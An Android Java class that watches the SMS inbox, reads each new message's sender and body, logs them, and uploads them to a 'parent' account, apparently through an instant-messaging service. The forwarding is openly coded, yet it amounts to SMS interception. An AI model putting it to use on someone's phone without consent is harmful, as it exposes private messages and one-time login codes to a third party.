package com.openim.tophone.utils;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;

import com.openim.tophone.enums.ActionEnums;
import com.openim.tophone.openim.IMUtil;

public class SmsContentObserver extends ContentObserver {
    private Context mContext;

    private long lastProcessedSmsId = -1;

    private final String  TAG = "SmsContentObserver";
    public SmsContentObserver(Context context, Handler handler) {
        super(handler);
        mContext = context;
    }

    @Override
    public void onChange(boolean selfChange) {
        super.onChange(selfChange);
        ContentResolver contentResolver = mContext.getContentResolver();
        Uri uri = Uri.parse("content://sms/inbox");
        Cursor cursor = contentResolver.query(uri, null, null, null, "date DESC LIMIT 1");
        if (cursor != null && cursor.moveToFirst()) {
            @SuppressLint("Range") long currentSmsId = cursor.getLong(cursor.getColumnIndex("_id"));
            if (currentSmsId != lastProcessedSmsId) {
                // 获取短信发送者
                @SuppressLint("Range") String sender = cursor.getString(cursor.getColumnIndex("address"));
                // 获取短信内容
                @SuppressLint("Range") String messageBody = cursor.getString(cursor.getColumnIndex("body"));

                L.d(TAG, "Received SMS from: " + sender + ", Message: " + messageBody);
                // 处理短信逻辑
                lastProcessedSmsId = currentSmsId;

                IMUtil.uploadMsg2Parent(ActionEnums.RECEIVED_SMS.getType(),sender,messageBody);
            }
            cursor.close();
        }
    }
}